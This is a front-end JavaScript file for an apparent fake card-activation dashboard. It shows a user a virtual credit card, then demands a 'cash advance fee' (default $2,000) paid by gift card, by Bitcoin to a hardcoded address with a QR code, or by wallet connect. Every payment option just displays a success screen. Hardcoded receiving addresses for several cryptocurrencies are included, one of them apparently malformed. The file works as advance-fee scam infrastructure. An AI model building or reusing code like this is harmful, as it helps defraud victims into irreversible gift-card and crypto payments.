document.addEventListener('DOMContentLoaded', () => {
  const currentUser = JSON.parse(localStorage.getItem('ocio_user'));
  if (!currentUser) {
    window.location.href = 'login.html';
    return;
  }

  // Function to render user card details
  const updateCardDetails = () => {
    const freshUser = JSON.parse(localStorage.getItem('ocio_user')) || currentUser;
    
    // Set User Name & initials
    document.getElementById('dash-user-name').innerText = freshUser.name || 'User';
    document.getElementById('avatar-initials').innerText = (freshUser.name || 'U').charAt(0).toUpperCase();
    
    const cardName = freshUser.cardName || freshUser.name || 'User Name';
    const cardNumber = freshUser.cardNumber || '•••• •••• •••• ••••';
    const cardExpiry = freshUser.cardExpiry || '12/29';
    const cardCvv = freshUser.cardCvv || '***';
    
    document.getElementById('cc-name').innerText = cardName;
    document.getElementById('cc-number').innerText = cardNumber;
    
    const expiryEl = document.getElementById('cc-expiry');
    if (expiryEl) expiryEl.innerText = cardExpiry;
    
    const cvvEl = document.getElementById('cc-cvv');
    if (cvvEl) cvvEl.innerText = cardCvv;
    
    const detailsName = document.getElementById('details-cc-name');
    if (detailsName) detailsName.innerText = cardName;
    
    const detailsNum = document.getElementById('details-cc-number');
    if (detailsNum) detailsNum.innerText = cardNumber;
    
    const detailsExp = document.getElementById('details-cc-expiry');
    if (detailsExp) detailsExp.innerText = cardExpiry;
    
    const detailsCvv = document.getElementById('details-cc-cvv');
    if (detailsCvv) detailsCvv.innerText = cardCvv;
  };

  // Function to update wallet addresses
  const updateWalletAddress = () => {
    let addrs = {
      btc: 'bc1qxn75r74yxn506avewznvleyg80epcvmaduunpv',
      eth: '0xACBb8780B0eA4aDb9c87e7E9cc80b8D17d5F6060',
      sol: 'DSkxE7spkNuX26EwWHiGuPpq8eZXzFTzpFGxFbckHavi',
      usdt: '0xACBb8780B0eA4aDb9c87e7E9cc80b8D17d5F6060',
      bnb: '0xACBb8780B0eA4aDb9c87e7E9cc80b8D17d5F606'
    };
    try {
      const saved = JSON.parse(localStorage.getItem('ocio_wallet_addresses'));
      if (saved) addrs = { ...addrs, ...saved };
    } catch {}

    const btcAddrEl = document.getElementById('cc-btc-addr');
    if (btcAddrEl) {
      btcAddrEl.innerText = addrs.btc;
      
      const qrImg = document.querySelector('#cc-form-btc img');
      if (qrImg) {
        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(addrs.btc)}`;
      }
    }
  };

  // Initial runs
  updateCardDetails();
  updateWalletAddress();

  // If sync completes, update again
  if (window._cloudSyncReady) {
    window._cloudSyncReady.then(() => {
      updateCardDetails();
      updateWalletAddress();
    });
  }

  // Set Cash Advance Fee
  const feeAmount = currentUser.cashAdvanceFee || 2000;
  const formattedFee = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(feeAmount);
  
  document.getElementById('cc-fee-amount').innerText = formattedFee;
  document.querySelectorAll('.cc-fee-display').forEach(el => el.innerText = formattedFee);

  // Steps
  const step1 = document.getElementById('cc-step-1');
  const step2 = document.getElementById('cc-step-2');
  const step3 = document.getElementById('cc-step-3');

  // Activate Button
  document.getElementById('cc-activate-btn').addEventListener('click', () => {
    step1.style.display = 'none';
    step2.style.display = 'block';
  });

  // Back Button
  document.getElementById('cc-back-btn').addEventListener('click', () => {
    step2.style.display = 'none';
    step1.style.display = 'block';
    
    // Hide all forms
    document.querySelectorAll('.wd-method-form').forEach(form => form.style.display = 'none');
  });

  // Payment Methods
  const methodBtns = document.querySelectorAll('.cc-method');
  methodBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      const method = btn.getAttribute('data-method');
      
      // Hide all forms
      document.querySelectorAll('.wd-method-form').forEach(form => form.style.display = 'none');
      
      // Show selected form
      const form = document.getElementById(`cc-form-${method}`);
      if (form) form.style.display = 'block';
    });
  });

  // Form Submissions
  const showSuccess = (e) => {
    if (e) e.preventDefault();
    step2.style.display = 'none';
    step3.style.display = 'block';
  };

  const giftCardForm = document.getElementById('cc-giftcard-form');
  if (giftCardForm) giftCardForm.addEventListener('submit', showSuccess);

  const btcPaidBtn = document.getElementById('cc-btc-paid');
  if (btcPaidBtn) btcPaidBtn.addEventListener('click', showSuccess);

  const walletConnectBtn = document.getElementById('cc-wallet-connect');
  if (walletConnectBtn) walletConnectBtn.addEventListener('click', showSuccess);

  // Copy BTC Address
  const copyBtn = document.getElementById('cc-copy-btc');
  if (copyBtn) {
    copyBtn.addEventListener('click', () => {
      const addr = document.getElementById('cc-btc-addr').innerText;
      navigator.clipboard.writeText(addr).then(() => {
        const originalHtml = copyBtn.innerHTML;
        copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
        setTimeout(() => copyBtn.innerHTML = originalHtml, 2000);
      });
    });
  }

  // Copy Credit Card Number
  const copyCcNumBtn = document.getElementById('cc-copy-number');
  if (copyCcNumBtn) {
    copyCcNumBtn.addEventListener('click', () => {
      const ccNum = document.getElementById('details-cc-number').innerText.replace(/\s+/g, '');
      navigator.clipboard.writeText(ccNum).then(() => {
        const originalHtml = copyCcNumBtn.innerHTML;
        copyCcNumBtn.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => copyCcNumBtn.innerHTML = originalHtml, 2000);
      });
    });
  }
});
